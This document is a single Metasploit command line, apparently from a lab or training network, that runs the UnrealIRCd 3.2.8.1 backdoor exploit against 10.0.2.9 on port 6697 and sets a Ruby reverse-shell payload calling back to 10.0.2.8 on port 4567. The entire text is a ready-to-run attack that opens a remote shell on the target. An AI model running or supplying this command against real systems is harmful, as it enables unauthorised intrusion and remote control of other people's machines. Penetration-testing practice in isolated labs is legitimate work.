/usr/bin/msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor;set rhost 10.0.2.9;set rport 6697;set payload cmd/unix/reverse_ruby;set lhost 10.0.2.8;set lport 4567; run;"

